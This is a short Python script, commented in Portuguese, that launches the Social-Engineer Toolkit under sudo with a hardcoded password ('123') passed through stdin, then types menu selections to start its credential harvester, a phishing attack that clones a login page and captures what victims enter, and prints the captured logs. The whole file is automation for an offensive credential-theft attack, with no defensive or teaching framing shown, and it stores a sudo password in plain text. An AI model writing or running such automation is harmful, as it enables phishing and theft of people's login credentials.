import subprocess
import time

# CONFIGURAÇÕES
senha = "123"
comando_app = "setoolkit"

# Monta o comando com sudo -S (Lê senha do stdin)
# O '-p' '' serve para remover o prompt "Password:" da saída, limpando o log
comando_completo = ["sudo", "-S", "-p", "", comando_app]

try:
    print(f"--- Iniciando {comando_app} com SUDO ---")

    processo = subprocess.Popen(
        comando_completo,
        stdin=subprocess.PIPE,  # Habilita escrita (para senha e menu)
        stdout=subprocess.PIPE,  # Habilita leitura
        stderr=subprocess.STDOUT,  # Erros e logs juntos
        text=True,
        bufsize=1  # Buffer linha a linha
    )

    # --- FASE 1: Passar pelo SUDO ---
    # O sudo -S espera a senha imediatamente
    processo.stdin.write(f"{senha}\n")
    processo.stdin.flush()

    # Dê um pequeno respiro para o programa carregar o menu após o sudo liberar
    time.sleep(1)

    # --- FASE 2: Passar pelo Menu Interativo ---
    # Agora o seu programa está rodando e esperando a opção
    print(f"Ativando credencial harvester")
    processo.stdin.write(f"1\n")
    processo.stdin.flush()

    time.sleep(1)
    processo.stdin.write(f"2\n")
    processo.stdin.flush()

    time.sleep(1)
    processo.stdin.write(f"3\n")
    processo.stdin.flush()

    time.sleep(1)
    processo.stdin.write(f"1\n")
    processo.stdin.flush()

    time.sleep(1)
    processo.stdin.write(f"\n")
    processo.stdin.flush()

    time.sleep(1)
    processo.stdin.write(f"2\n")
    processo.stdin.flush()

    print("--- Monitoramento Iniciado ---")
    print("-" * 30)

    # --- FASE 3: Leitura dos Logs ---
    for linha in processo.stdout:
        linha = linha.strip()
        print(f"[LOG]: {linha}")

except PermissionError:
    print("Erro: O Python não teve permissão para executar o arquivo.")
except KeyboardInterrupt:
    print("\nParando...")
    processo.terminate()
except Exception as e:
    print(f"Erro inesperado: {e}")